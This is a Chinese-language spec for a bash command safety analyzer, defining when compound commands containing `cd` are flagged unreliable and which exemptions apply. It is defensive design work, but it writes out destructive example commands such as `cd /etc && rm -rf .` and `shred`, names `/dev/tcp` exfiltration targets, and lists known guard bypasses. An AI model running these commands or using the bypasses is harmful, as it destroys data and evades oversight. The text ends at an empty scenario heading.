## MODIFIED Requirements

### Requirement: cd cwd 变更判不可靠

**重定向 token 的位置参数收集细化（本 change 新增）**：cd 跟踪豁免与全绝对下游豁免的路径引用判定（`collectStagePathRefs`）MUST NOT 把「重定向形态 token」当位置参数收集——`tokenize` 不拆分 `2>/dev/null`、`>foo`、`>>foo`、`2>&1`、`<in`、`<<EOF` 等形态（实测 `tokenize("ls /abs/x 2>/dev/null")` → `["ls","/abs/x","2>/dev/null"]`），而重定向目标已由 `collectStagePathRefs` 末尾的重定向扫描单独提取（`>`/`>>`/`2>`/`2>>`/`2>&`/`<`/`<<` 逐字符扫描并提取 target）。位置参数循环对这些 token 的重复收集是多余且有害的——它把 `2>/dev/null` 整串当非绝对引用（`looksLikePath("2>/dev/null")` 为 false），使 D2a 条件 9「不可提取裸词排除」与 D2b「全部路径引用绝对」双双命中，导致 `cd <绝对> && ls <绝对路径> 2>/dev/null` 这类纯 `&&` 链 + 全绝对下游命令误判 `cd_chdir` 弹窗，违反「全绝对下游豁免」既有契约。

**重定向 token 的识别判据**：仅跳过「目标已由重定向扫描提取」或「确无文件目标」的形态，**逐项对齐扫描的实际提取覆盖**：

- **纯数字 fd 复制/关闭**——`/^[0-9]*>&(?:[0-9]+|-)$/`（`2>&1`、`>&2`、`2>&3`、`2>&-`）。扫描对 `>&` 一律 `continue`（无文件目标），跳过无碍。
- **文件重定向**——`/^[0-9]*(?:>>|>|<).+/` 且不含 `&` 且非 `<<` 前缀（`1>`、`2>`、`3>`、`>`、`>>`、`1>>`、`<`）。扫描逐字符推进到 `>`/`<` 处识别并提取其后目标（`N>` 的 `N` 被当普通字符跳过，`>` 处仍识别并提取目标）。**`.+` 要求操作符后至少一个字符**：`>&file`/`2>&file` 经 `splitCommands` 在 `&` 处拆分会产生裸 `>`/`2>`（如 "ls /tmp/x >"），裸操作符不匹配 `. +` → 不跳过（被收集为不可提取裸词 → 条件 9 排除，保守 cd_chdir）；若不带 `. +`，裸 `>` 被跳过 → `>&rel.txt` 的写目标 `rel.txt` 完全丢失 → D2b 豁免成立 → **静默放行写相对目标**（安全洞，架构 review critical 修复的关键判据）。

**不命中（不跳过，保持收集 → 保守 cd_chdir，与现状一致）**，以下三类：

- `>&file` / `2>&file` / `N>&file`（**文件词 fd 复制**，等价 `>file 2>&1`）——扫描对 `>&` 一律 `continue` 不提取其文件目标；跳过会丢失写目标 → cd 豁免成立 → **静默放行相对写目标**（安全洞，架构 review critical 修复）。保持收集，`looksLikePath(">&rel.txt")` 为 true（`.txt` 后缀）但仍被收集为相对 ref → D2b `hasCwdRelativePathRef` 命中 → 保守 `cd_chdir`（现状不变，安全）。
- `&>` / `&>>`（如 `&>log`）——不以标准操作符开头（`&` 非数字、非 `>`/`<`），不命中判据，保持收集。`collectStagePathRefs` 重定向扫描对 `&>log` 兜底：`&` 被当普通字符跳过、`>` 处识别并提取 `log` 为相对 ref → D2b `hasCwdRelativePathRef` / D2a 条件 9 拒绝 → 保守 `cd_chdir`（安全，即使不跳过也不会静默放行）。但 `extractRedirects`（真实 target 提取）**不识别** `&>` 操作符（操作符列表无 `&>`），故 `log` 写目标不进 targets——此为**已知边界**，待后续独立 change 扩展 extractRedirects 识别 `&>`。本判据不跳过（保持收集 + 扫描兜底），现状保守弹窗不变。
- `foo>bar`（位置参数 + 重定向混合 token）——`foo` 是真实位置参数，不以操作符开头，不命中。`looksLikePath("foo>bar")` 为 false → D2a 条件 9 / D2b 排除 → 维持 `cd_chdir`（现状不变）。

**跳过安全论证**：跳过的 token 其重定向目标已由重定向扫描提取为 ref，各形态结论：

- `2>/dev/null` → 扫描提取 `/dev/null`（绝对，`isExplicitAbsolutePath` 为 true，不构成 D2b 障碍；`/dev/*` 在 extractRedirects 写分支被静默跳过，不加入 targets）→ 无碍。
- `1>rel.txt` / `3>rel.txt` / `2>rel.txt` → 扫描提取 `rel.txt`（有扩展名 → `looksLikePath=true`，条件 9 不触发）。该形态在 cd 链下走 **D2a（cd-tracking）豁免成立**：`rel.txt` 经 `resolveBase` 解析为 post-cd 写目标（`reliable:true`，写目标提取），与现状一致（实测现状 `1>rel.txt`/`3>rel.txt`/`2>rel.txt` 均已 `reliable:true` 且 `rel.txt` 被提取为 write target）——本判据不改变其行为，仅消除「无扩展名目标（如 `2>/dev/null`）依赖 `looksLikePath` 碰巧」的不稳定性。
- `>foo` / `<in` → 扫描提取 `foo`/`in`（相对，`hasCwdRelativePathRef` 命中 → D2b 排除；D2a 条件 9 `looksLikePath` 为 false）→ 保守弹窗，正确。
- `2>&1` → fd 复制，重定向扫描明确跳过 → 无 ref → 无碍。
- `<<EOF` → heredoc 形态（`splitCommands` 可能拆分其内容为独立片段，本判据不跳过 `<<` 前缀——保守维持现状 cd_chdir）。

**`2>>/abs/err.log` 稳定性说明**：该形态现状碰巧放行（`.log` 后缀使 `looksLikePath` 为 true，不触发条件 9），但依赖扩展名碰巧命中而非语义判据——`2>>/tmp/x`（无扩展名）又弹。本 change 使此类 token 统一按重定向形态跳过，写目标由扫描提取为绝对 ref（不构成障碍），行为稳定。

若 bash 命令为复合命令（以 `;`、`&&`、`||`、`&` 或换行分隔），且任一复合命令片段的第一个 token（basename，去掉路径前缀）为 `cd`，系统 MUST 判定整条命令为不可靠，reason 为 `cd_chdir`——**除非满足「cd 跟踪豁免」或「全绝对下游豁免」（见下方两条豁免）**。

单命令形式的 `cd`（不含 `;`、`&&`、`||`、`&` 或换行分隔符）MUST NOT 触发此规则——`cd /etc` 单独执行不产生文件访问，可静默放行。

**cd 跟踪豁免（本 change 新增，治本）**：当复合命令满足以下**全部**条件时，MUST NOT 判 `cd_chdir`，改为**顺序模拟 cwd**——每个 `cd` 片段更新模拟 cwd 到其目标，后续片段的相对路径按模拟 cwd 解析（见下方「cwd 模拟解析」节）：

1. **纯 `&&` 链**——`splitCommands` 拆出的所有片段之间都是 `&&` 分隔（无 `;`、`||`、`&`、`\n`）；分隔符判定 MUST 复用 `splitCommands` 的 quote-aware 分隔扫描，不得裸扫 `;`/`||`/`&`/`\n`（引号内的 `;` 不是分隔符，如 `cd /tmp/x && echo "a;b"` 仍应判纯 `&&` 链）。理由：`&&` 短路语义保证「下游片段执行 ⇒ 前面所有 cd 都成功 ⇒ cwd = 最后一个成功 cd 的目标」——这是 cwd 跟踪确定性的基础（实验已验证：`&&` 下 cd 失败 → 下游不执行；`;` 下 cd 失败 → 下游仍执行，cwd 不更新，不可静态确定）
2. **所有 cd 目标都是显式绝对路径**——每个 `cd <target>` 的 `<target>` 以 `/` 开头或满足 Windows 盘符 `C:\`，且不含 `$VAR`、`~`、未加引号 glob 元字符、相对前缀（`./`/`../`）；**绝对性判定作用于 `tokenize` 去引号后的 token 形式**（如 `cd "/tmp/x"` 去引号后为 `/tmp/x`，判绝对）。理由：相对 cd 目标依赖当前 cwd 与 `CDPATH`（实验已验证 CDPATH 完全改变 `cd sub` 的目标）；`~`/`$VAR`/`cd -` 均依赖运行时环境——均不可静态确定
3. **管道逐 stage 路径安全**——下游片段允许含管道，但其 `splitPipelines` 拆出的**每个 pipeline stage**（fd 复制如 `2>&1` 不是分隔符，留在其所属 stage 内不拆分）MUST 逐 stage 满足条件 4~11 的同等内容（cwd 锚点 / 未加引号 glob / 网络套接字与数字 fd / 不可提取裸词 / `$PWD`·`$OLDPWD` / 无 extractor 命令非绝对位置参数 / git 写子命令检查，均按 stage 内的路径引用判定）；cd 片段自身的 `splitPipelines` 结果 MUST 仍恰好 1 stage（`cd a | b` 语义不可静态确定）。**理由**：bash 管道各 stage 继承 `cd` 后的 cwd，其路径解析语义与下游片段完全一致——逐 stage 应用同一组检查后无安全增量；原「无管道」一刀切对 `cd <绝对> && npm test 2>&1 | tail -25` 这类下游零路径引用的纯 stdin 管道产生误弹窗（与无管道的 `cd <绝对> && npm test` 静默放行不等价）。转发器（`xargs`/`parallel`/`pforeach`）不在此条件排除——cd 守卫豁免后由「转发器命令守卫」独立判定（entry 层 cd 守卫豁免不短路后续扫描）
4. **无 cwd 锚点路径引用**——cd 片段之后的任何下游片段 MUST NOT 含 cwd 锚点路径引用（`.`、`..`、`./`、`../`、或以 `.`/`..` 结尾/含 `.`/`..` 片段的相对路径，含重定向目标与位置参数）。理由：`.`/`..` 是 cwd 的锚点，`looksLikePath`/`extractRedirects` 不把它们提取为 target（实测 `rm -rf .` 在非 cd 场景提取 0 target），若在 cd 跟踪下放行会**静默放行 cwd 锚点操作**（`cd /etc && rm -rf .` 真实删 `/etc` 内容，但跟踪下提取 0 target 绕过拦截）——这是 cd 跟踪豁免的**安全洞**，必须显式排除
5. **无未加引号 glob**——cd 片段之后的任何下游片段 MUST NOT 含未加引号的 glob 元字符（`*`、`?`、`[`，含位置参数与重定向目标）。理由：glob 展开依赖执行时的 cwd，cd 跟踪下 cwd 已漂移；且「有界 glob 免不可靠标记」的空 prefix 放宽（边界①情形 B）假设 `cwd == projectRoot`，该假设在 cd 链下**失效**——`cd /tmp/x && ls *.md` 的真实展开在 `/tmp/x`，不在 projectRoot，若放行会误解析到 projectRoot。故 cd 跟踪豁免统一排除 glob（无论前缀空/相对/绝对），维持 `cd_chdir`
6. **无网络套接字 / 数字 fd 重定向目标**——cd 片段之后的任何下游片段 MUST NOT 含网络套接字 / 数字 fd 重定向目标（`/dev/tcp/`、`/dev/udp/`、`/dev/fd/[0-9]+` 前缀）。理由：它们是网络外传 / 任意 fd 访问目标，不是「cd 造成的 cwd 漂移影响文件系统路径解析」的场景，cd 跟踪豁免的语义（cwd 模拟解析真实落点）对其不适用；含此类目标的片段使 D2a 豁免不适用，维持 `cd_chdir`（网络外传不因 cd 豁免被放行）
7. **无不可提取的非绝对路径引用**——cd 片段之后的任何下游片段 MUST NOT 含不可提取的非绝对路径引用（见条件 9 的判定范围：位置参数 + 重定向目标 + curl/wget 输出写目标）。**任一非绝对且 `looksLikePath` 判定为 false 的引用**（如 `sub/`、`sub`、`src`——`looksLikePath` 对不含 `/` 前缀/`.`/`..`/扩展名的裸词返回 false，实测 `rm -rf sub/`、`cat sub`、`echo x > sub` 均提取 0 target）使 D2a 豁免不适用。理由：此类引用的真实落点依赖漂移后 cwd（`cd /tmp/x && rm -rf sub/` 真实删 `/tmp/x/sub`、`cd /etc && echo x > sub` 真实写 `/etc/sub`、`cd /etc && curl -o sub url` 真实写 `/etc/sub`），但 `looksLikePath` 不把它提取为 target（实测提取 0 target）——若在 cd 跟踪下放行会**静默放行外区写/删**（0 target → decision 层不弹窗），这是 cd 跟踪豁免的**安全洞**，必须显式排除。本条件覆盖写/删命令位置参数（原条件 7 只查此类）、read-only 命令位置参数（`cat sub`）、重定向目标（`echo x > sub`）、与 curl/wget 输出写目标（`curl -o sub`/`wget -O sub`/`curl -O` 无参，F1 修复）四类
8. **无 `$PWD` / `$OLDPWD`**——cd 片段之后的任何下游片段 MUST NOT 含 `$PWD` / `$OLDPWD`。理由：`$PWD` 是 SAFE_VAR（`expandSafeVariables` 用真实进程 env["PWD"] 展开），不随模拟 cwd 漂移——`cd /tmp/x && cat $PWD/foo` 的真实落点是 `/tmp/x/foo`，但 `$PWD` 展开为真实 cwd（如 projectRoot），解析器按 env["PWD"] 解析错位；且 D2a 的「相对路径按模拟 cwd 解析」假设被 `$PWD` 破坏。故排除，维持 `cd_chdir`
9. **无未加引号 glob / cwd 锚点 / 网络套接字 / 数字 fd 的不可提取裸词**——条件 4-8 的判定范围覆盖下游片段的全部路径引用（位置参数 + 重定向目标），**不做 `looksLikePath` 过滤**：不可提取裸词（`sub`、`sub/`）也纳入判定，因其在 cd 链下真实落点依赖 cwd 但无法提取为 target，豁免会静默放行。条件 4-8 任一命中即排除豁免
10. **无 extractor 命令无非绝对位置参数**——cd 片段之后的任何下游片段，若其首命令**不在 `COMMAND_TABLE`（无 extractor）**，则该命令的所有位置参数 MUST 要么是显式绝对路径，要么不属于文件路径引用（文本参数命令）。任一非绝对位置参数（如 `cd /tmp/x && sort data.txt` 的 `data.txt`）使 D2a 豁免不适用。理由：无 extractor 命令（`sort`/`tar`/`cmp`/`diff`/`uniq`/`sha256sum`/`gzip`/`xz`/`git_log` 等）无法消费 `resolveBase` 提取真实落点——其位置参数永远不被加入 targets（entry.ts 的 COMMAND_TABLE miss → D6 unknown command → 0 target），若 D2a 豁免成立会 `reliable:true + 0 target` 静默放行（`cd /tmp/x && sort data.txt` 真实读 `/tmp/x/data.txt` 但提取 0 target）。条件 9 只排除**不可提取**裸词（`looksLikePath=false`），不覆盖**可提取**相对路径（`data.txt`，`looksLikePath=true`）——这是条件 10 独立存在的理由。绝对路径位置参数（如 `cd /etc && sort /tmp/data.txt`）不依赖 cwd，不受影响（走 D2b 豁免）。本条件覆盖范围与条件 7 的 write/delete 命令集合互补：条件 7 只查 write/delete 命令，条件 10 查所有无 extractor 的文件参数命令（含 read-only 的 `sort`/`cmp`/`uniq`/`sha256sum`、压缩的 `gzip`/`xz`、归档的 `tar`、比较的 `diff`）。**F2 补漏（已知清单，三波，非形式化穷尽）**：`FILE_ARG_COMMANDS` 涵盖已知「无 extractor + 位置参数是文件引用」的命令类——校验和类（`md5sum`/`sha1sum`/`sha224sum`/`sha384sum`/`sha512sum`/`b2sum`/`cksum`/`sum`）、文本行处理类（`tac`/`nl`/`od`/`comm`/`join`/`paste`/`cut`/`sdiff`）、解压转换类（`gunzip`/`unxz`/`bzip2`/`bunzip2`/`zcat`）、元数据类（`chgrp`）。否则该类命令（如 `cd /etc && md5sum sub`）仍 `reliable:true + 0 target` 静默放行读敏感目录，与 F2 critical 同类别同后果。**第二波穷尽**（f2b-recheck 复核中断前提出的残留类 + 全量扫描证实）：目录列举类（`dir`/`vdir`，ls 变体）、文本/编码处理类（`shuf`/`base64`/`basenc`/`expand`/`unexpand`/`fmt`/`fold`/`ptx`/`tsort`）、路径元数据类（`pathchk`/`realpath`/`readlink`/`pinky`，其中 `pinky -f` 读文件）、创建/删除类（`mktemp`/`link`/`unlink`/`mknod`/`mkfifo`——写工作树，`unlink sub` 静默删除、`mkfifo sub` 静默创建特殊文件为最高危写形态）。**第三波**（final-closeout-review 判 APPROVED_WITH_CHANGES issue 1，实测 19 命令仍静默放行）：原地覆写/分割类（`shred`/`split`/`csplit`——`shred sub` 原地覆写、`split sub` 向 cwd 写分片为最高危写形态）、压缩/归档类（`bzcat`/`xzcat`/`lzma`/`lz4`/`zstd`/`bzip3`/`unzip`/`zip`）、校验和/比较类（`shasum`/`sha3sum`/`diff3`）、转换/格式化/补丁类（`dos2unix`/`rev`/`column`/`pr`/`patch`，含 stdin 重定向形态 `patch -p0 < p.txt`）。**清单完备性声明**：本清单是「已知文件参数命令」的持续清点而非穷尽证明——清单外同类命令的残留为已知边界（tasks.md 记录，含 `env`/`nice`/`nohup` 等命令执行器类与条件 11 的尾挂 `cd /tmp` 旁路、D2b 路径 git 写子命令旁路），本条件以**排除判据**为准（无 extractor 且位置参数是 cwd 文件引用的命令都应被收集排除），后续新增同类命令按此判据补入清单。**排除判据**：位置参数不是 cwd 文件引用的命令不纳入——`id`/`uname`/`tty`/`logname`/`groups`/`seq`/`factor`/`numfmt`（位置参数是用户名/数字）、`basename`/`dirname`（字符串操作，无文件访问），实测确认保持豁免；`env`/`nice`/`nohup`/`timeout`/`setsid`/`watch`/`stdbuf` 等命令执行器（位置参数是 PATH 解析的命令名，仅 `./` 前缀形态 cwd 依赖）属另一类，需 wrapper 感知设计，见 tasks.md 已知边界记录（待后续 change）
11. **无 git 写子命令且 cd 落点非默认 tmp 目录**——若 cd 链的**最终 cd 落点**（最后一个 cd 片段的目标）不在默认 tmp 目录（`/tmp`、`/private/tmp`、`/var/tmp`，判定复用 `isDefaultTmpPath`），则 cd 片段之后的任何下游片段 MUST NOT 是 git **写**子命令（`rm`/`add`/`commit`/`checkout`/`clean`/`mv`/`reset`/`revert`/`stash` 等，即不在 `GIT_READONLY_SUBCOMMANDS` 集合的 git 子命令）。git 写子命令修改工作树文件（删除/覆盖），其路径参数是 git 内部管理的 pathspec——本解析器不把 git 路径参数提取为 target（git 不在 COMMAND_TABLE），若豁免成立会 `reliable:true + 0 target` 静默放行（`cd /etc && git rm file.txt` 真实删除 `/etc/file.txt` 但提取 0 target）。**用户（总体设计部）拍板**：git **只读**子命令（`log`/`show`/`diff`/`status`/`branch`/`tag`/`remote`/`config`/`rev-parse`/`rev-list`/`shortlog`/`blame`/`ls-files`，pathspec 是 git 内部管理的查询条件，非 shell cwd 文件引用）在 cd 链下**静默放行正确**——本条件不排除它们；git **写**子命令在 cd 落点非默认 tmp 目录时保守排除（回退 `cd_chdir`），cd 落点在默认 tmp 目录时**静默放行**（tmp 无持久安全价值，与 `decision.ts` step 2c 的 `tmp_default_allowed` 语义一致）。git 子命令分类单一事实源：`GIT_READONLY_SUBCOMMANDS`（git-cmds.ts，与 `SILENT_COMMANDS.git` 一致）

**全绝对下游豁免（本 change 新增）**：当复合命令中**所有** `cd` 片段之后的**下游命令片段**（按 `;`/`&&`/`||`/`&`/换行拆分，位于任一 `cd` 片段之后）满足以下**全部**条件时，MUST NOT 判 `cd_chdir`：

1. **至少一个下游片段含显式绝对路径引用**——豁免不能因"无路径引用"而空转生效（`ls` 单独、`npm test` 单独这类隐式依赖 cwd 的片段不构成豁免证据，维持保守）
2. **所有下游片段的全部路径引用都是绝对路径**——路径引用包括：
   - `looksLikePath` 判定的**位置参数**（以 `/`、`~`、`C:\` 开头，或 `./`/`../` 前缀、带扩展名相对词）
   - **重定向目标**（`>`/`>>`/`2>`/`2>>`/`<` 等操作符后的目标路径）
   任一路径引用不是显式绝对路径（以 `/` 开头或 Windows 盘符）时，豁免不适用
   - **网络套接字 / 数字 fd 重定向目标**（`/dev/tcp/`、`/dev/udp/`、`/dev/fd/[0-9]+` 前缀）**即使以 `/` 开头也不构成豁免证据**——它们是网络外传 / 任意 fd 访问目标，不是「cd 造成的 cwd 漂移影响文件系统路径解析」的场景，豁免的语义（绝对路径解析不依赖 cwd）对其不适用；含此类目标的片段使豁免不适用，维持 `cd_chdir`
3. **无路径引用的片段不构成豁免阻碍，但也不构成豁免证据**——它们（如 `ls`、`pwd`、`echo hi`）被豁免时仍需满足条件 1（另有片段提供绝对路径证据）；若全部下游片段都无路径引用，条件 1 不满足，豁免不适用

**cwd 模拟解析（cd 跟踪豁免下）**：当 cd 跟踪豁免适用时，`extractBashTargets` 的逐片段提取（步骤 5）MUST 维护一个模拟 cwd——初始为 `projectRoot`，每遇到一个 cd 片段（目标为绝对路径）则更新模拟 cwd 为该目标，后续片段的相对路径解析基准 MUST 用模拟 cwd 而非固定 projectRoot。绝对路径引用始终按自身解析（不依赖 cwd）。

**豁免的边界**：
- **cd 跟踪豁免优先于全绝对下游豁免**——cd 跟踪豁免是治本（真实算落点），全绝对下游豁免是兜底（只对绝对路径适用）；两者对同一命令不冲突（cd 跟踪豁免处理相对路径下游，全绝对下游豁免处理显式全绝对下游）
- **cd 跟踪豁免仅覆盖 cd 片段之后的片段**——cd 片段之前的片段（若有，如 `echo hi && cd /tmp/x && ...`）不受 cd 影响，按 projectRoot 解析；cd 片段自身是 cwd 变更者，不参与路径解析
- **cd 跟踪豁免下的 cwd 模拟是顺序的**——`cd /tmp/a && cd /tmp/b && cat x` 中，`cat x` 按 `/tmp/b` 解析（最后一个成功 cd 的目标）；`cd /tmp/a && cat x` 中，`cat x` 按 `/tmp/a` 解析
- **cd 跟踪豁免下的 cd 目标必须是绝对路径**——任一 cd 目标不是绝对路径（相对、`~`、`$VAR`、glob）时，cd 跟踪豁免不适用，整条命令维持 `cd_chdir`（保守：相对 cd 目标不可静态确定）
- 豁免判定在 `scanCdChdir` 内完成，不影响其他守卫（`glob_expansion`、`shell_forwarder` 等仍按各自规则判定）

**理由**：`cd` 是 bash 内建，会改变后续所有相对路径命令的 cwd 基准。当前实现把相对路径的解析基准固定为 `<projectRoot>`，完全忽略 `cd` 的实际效果，导致 `cd /etc && rm -rf .` 中的 `.` 被解析为 `<projectRoot>/.` 而非 `/etc/`，实际执行会删除 `/etc` 内容。把整条含 `cd` 片段的复合命令判为不可靠是"静态分析无法预测相对路径实际落点"的最小侵入修复。

**cd 跟踪豁免的理由**：`&&` 链 + 绝对 cd 目标下，cwd 落点是**可静态确定的**——`&&` 短路保证下游只在 cd 成功时执行（cd 成功 ⇒ cwd = cd 目标），绝对 cd 目标不受 `CDPATH`/`$HOME`/`cd -`/相对链干扰（均已实验验证）。此时「相对路径落点不确定」的根本问题不再存在，解析器可真实算出 cd 后的相对路径落点（如 `cd /tmp/x && echo hi > rel.txt` → 解析出 `/tmp/x/rel.txt` 而非 `<projectRoot>/rel.txt`），无需判不可靠。相对 cd 目标、`;`/`||` 分隔符下 cwd 仍不可静态确定，维持 `cd_chdir` 保守拦截。

**全绝对下游豁免的理由**：当 `cd` 之后的下游片段**显式引用**路径且**全部为绝对路径**时，`cd` 造成的 cwd 漂移**不影响**任何路径解析——绝对路径解析不依赖 cwd。此时 `cd_chdir` 的误判风险不存在（解析器不会把绝对路径解析到错误位置），判不可靠只会产生噪音弹窗。真实案例：`cd /tmp/pi-ui-ext-inspect/package && grep -n "..." extensions/index.ts | head -60` 中 cd 后跟的是相对路径 `extensions/index.ts`——该命令是纯 `&&` 链、cd 目标绝对，**cd 跟踪豁免适用**，解析出 `/tmp/pi-ui-ext-inspect/package/extensions/index.ts`（治本）；而 `cd /tmp/x && grep -n "..." /tmp/x/file | head` 下游全绝对，全绝对下游豁免适用。**豁免要求"至少一个显式绝对路径引用"**，防止 `cd /tmp/x && ls`（隐式读 cwd、无显式路径引用）被空转豁免——这类片段虽无目标解析错位（`ls` 无参数提取 0 target），但既有安全断言（`cd /etc && ls` → cd_chdir）把其视为应保守拦截的场景，且豁免它们不解决任何真实噪音。豁免仅覆盖"下游显式全绝对"的窄场景，不改变相对路径下游、无显式路径引用下游仍判不可靠的保守行为。

**反例（仍触发 cd_chdir）**：
- 下游含相对路径参数且命令不满足 cd 跟踪豁免（如 `cd /tmp/x; grep pattern file.txt`——`;` 分隔，cd 跟踪豁免不适用）
- 下游含相对重定向目标且命令不满足 cd 跟踪豁免（如 `cd /tmp/x; echo hi > rel.txt`）——`;` 分隔下 cwd 不可静态确定，豁免不适用
- 下游含 glob 前缀为相对路径或空 prefix（如 `cd /tmp/x; ls *.md`）——`;` 分隔，豁免不适用
- 下游含 `$VAR` 变量路径（如 `cd /tmp/x; cat $FILE`）
- 下游全部片段无显式路径引用（如 `cd /tmp/x; ls`、`cd /tmp/x; git status`）——全绝对下游豁免条件 1 不满足，cd 跟踪豁免因非纯 `&&` 链不适用
- **cd 目标为相对路径**（如 `cd sub && cat file.txt`、`cd ../foo && rm -rf .`）——cd 跟踪豁免条件 2 不满足（相对 cd 目标受 `CDPATH` 影响，不可静态确定）
- **cd 目标含 `~`**（如 `cd ~ && cat file.txt`）——依赖 `$HOME`，不可静态确定
- **cd 目标含 `$VAR`**（如 `cd $HOME && cat file.txt`）——不可静态确定
- **cd 目标含未加引号 glob**（如 `cd /tmp/*/ && cat file.txt`）——glob 展开目标集合不可静态枚举
- **`cd -`**（如 `cd /tmp/a && cd - && cat file.txt`）——栈语义依赖 cwd 历史，不可静态确定
- **含 `||` / `;` / `&` / 换行分隔**（如 `cd /tmp/x || cat file.txt`、`cd /tmp/x & cat file.txt`）——非纯 `&&` 链，cd 跟踪豁免不适用
- **下游含不可提取的非绝对路径引用**（如 `cd /etc && echo x > sub`、`cd /etc && cat sub`、`cd /tmp/x && rm -rf sub/`、`cd /tmp/x && mkdir sub`、`cd /etc && curl -o sub url`、`cd /etc && wget -O sub url`、`cd /etc && curl -O url`）——引用是 `looksLikePath` 判定为 false 的裸词（无扩展名/无 `/` 前缀/无 `.`/`..`），真实落点依赖漂移后 cwd（`/etc/sub` 等），但提取 0 target；若豁免放行会**静默放行写/删/读外区**，cd 跟踪豁免条件 7 不满足（本 change 修复前的安全洞，条件 7 原只查 write/delete 位置参数，已扩展覆盖 read-only 位置参数、重定向目标与 curl/wget 输出写目标——curl/wget 的 URL 位置参数是网络路径非文件引用，其输出写目标 flag 值由 `collectStagePathRefs` 定向收集供条件 9 排除，F1 修复）
- **下游命令无 extractor 且含非绝对位置参数**（如 `cd /tmp/x && sort data.txt`、`cd /etc && sort sub`、`cd /etc && tar xf sub`、`cd /etc && cmp sub`、`cd /etc && diff a b`、`cd /etc && gzip sub`、`cd /etc && xz sub`）——命令不在 `COMMAND_TABLE`（无 extractor），其位置参数无法被 `resolveBase` 提取为 target；`data.txt`（`looksLikePath=true` 可提取相对路径，条件 9 不触发）与 `sub`（不可提取裸词，条件 9 触发但需命令被 `FILE_ARG_COMMANDS` 收集）均使 cd 跟踪豁免不适用——若豁免放行会 `reliable:true + 0 target` **静默放行读/解压/压缩外区**，cd 跟踪豁免条件 10 不满足（本 change 修复前，`sort`/`tar`/`cmp` 等不在 `FILE_ARG_COMMANDS`，其裸词位置参数不被 `collectStagePathRefs` 收集，条件 9 看不到 → 豁免成立 + 0 target 静默放行；F2 修复补齐）。`sort /tmp/data.txt`（绝对位置参数）不受影响，仍走全绝对下游豁免（D2b）
- **下游为 git 写子命令且 cd 落点非默认 tmp 目录**（如 `cd /etc && git rm file.txt`、`cd /etc && git checkout file.txt`、`cd /etc && git add file.txt`、`cd /etc && git mv a.txt b.txt`）——git 写子命令（不在 `GIT_READONLY_SUBCOMMANDS`）修改工作树文件，其路径参数是 git 内部管理的 pathspec，本解析器不提取为 target；cd 落点 `/etc` 非默认 tmp（`isDefaultTmpPath` 判 false），若豁免放行会 `reliable:true + 0 target` **静默放行删除/覆盖工作树文件**（`cd /etc && git rm file.txt` 真实删除 `/etc/file.txt`），cd 跟踪豁免条件 11 不满足（用户拍板：非 tmp 落点保守排除）。**例外（静默放行）**：cd 落点在默认 tmp 目录（`cd /tmp/x && git rm file.txt`、`cd /var/tmp/x && git rm file.txt`）时条件 11 不触发（tmp 无持久安全价值），仍静默放行；git 只读子命令（`cd /etc && git log file.txt`、`cd /etc && git status`）不在此反例（用户拍板：只读子命令静默放行正确，pathspec 非 cwd 文件引用）
- **下游为 coreutils 文件命令类（校验和/文本行处理/解压转换/元数据）裸词位置参数**（如 `cd /etc && md5sum sub`、`cd /etc && sha512sum sub`、`cd /etc && b2sum sub`、`cd /etc && cksum sub`、`cd /etc && comm a b`、`cd /etc && join a b`、`cd /etc && paste sub`、`cd /etc && nl sub`、`cd /etc && cut -d: -f1 sub`、`cd /etc && tac sub`、`cd /etc && sdiff a b`、`cd /etc && gunzip sub`、`cd /etc && zcat sub`、`cd /etc && chgrp grp sub`）——这些命令无 extractor（不在 `COMMAND_TABLE`）且位置参数是文件引用（校验和/文本行处理/解压转换/元数据类），不在 `FILE_ARG_COMMANDS` 时其裸词不被 `collectStagePathRefs` 收集，条件 9 看不到 → 豁免成立 + 0 target 静默放行（`cd /etc && md5sum sub` 静默读 /etc/sub，与 F2 critical 同类别同后果）。F2 补漏后加入 `FILE_ARG_COMMANDS`，其裸词位置参数被收集，条件 10 排除豁免（维持 cd_chdir）。`md5sum /tmp/a.txt`（绝对位置参数）不受影响，仍走 D2b 豁免。**第二波穷尽**：`cd /etc && dir sub`、`cd /etc && shuf sub`、`cd /etc && base64 sub`、`cd /etc && realpath sub`、`cd /etc && mktemp subXXXXXX`、`cd /etc && unlink sub`、`cd /etc && mkfifo sub` 等目录列举/文本编码/路径元数据/创建删除类同判（`unlink sub` 静默删除 `/etc/sub`、`mkfifo sub` 静默创建特殊文件为最高危写形态）；`id sub`（用户名）、`basename sub`（字符串操作）、`seq 100`（数字）位置参数非 cwd 文件引用，不在此反例（实测保持豁免）。**第三波**：`cd /etc && shred sub`（原地覆写——最高危写形态）、`cd /etc && split sub`（向 cwd 写分片 xaa/xab…）、`cd /etc && csplit sub 1`、`cd /etc && unzip sub.zip`、`cd /etc && zip a.zip sub`、`cd /etc && zstd sub`、`cd /etc && bzcat sub`、`cd /etc && shasum sub`、`cd /etc && diff3 a b c`、`cd /etc && dos2unix sub`、`cd /etc && patch -p0 < p.txt`（stdin 重定向形态）等同判

#### Scenario: cd 后接写入命令判不可靠

- **WHEN** bash 命令为 `cd /etc && rm -rf .`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——下游 `rm -rf .` 含 cwd 锚点路径引用 `.`，cd 跟踪豁免条件 4 不满足（`.` 是 cwd 锚点，`extractRedirects`/`looksLikePath` 不提取为 target，若放行会静默放行删 `/etc` 内容）；全绝对下游豁免条件 2 亦不满足（`.` 非显式绝对）

#### Scenario: cd 后接读取命令判不可靠

- **WHEN** bash 命令为 `cd /etc && ls`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——纯 `&&` 链 + 绝对 cd 目标 + 无管道 + 无 cwd 锚点 + 无 glob（cd 跟踪豁免条件 1-5 全满足）；下游 `ls` 无路径参数提取 0 target，按跟踪 cwd `/etc` 解析无影响。**行为变化（预期）**：既有 `security-probe.mjs` L3 断言原判 `cd_chdir`，本 change 后变 `reliable:true`——这是「cd 跟踪豁免」的预期行为变化，非意外回归，需在 apply 阶段同步更新既有断言

#### Scenario: 单命令 cd 不触发

- **WHEN** bash 命令为 `cd /etc`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——无复合命令片段，`cd` 单独执行不产生文件访问

#### Scenario: cd 在管道片段中判不可靠

- **WHEN** bash 命令为 `cd src && cat a.txt | sort`
- **THEN** 提取结果为 `{ reliable: false, reason: "cd_chdir" }`——cd 目标 `src` 是相对路径（cd 跟踪豁免条件 2 不满足），且含管道 `|`（条件 3 不满足）；复合命令中的 `cd` 片段触发，管道不影响判定

#### Scenario: cd 在后续片段中判不可靠

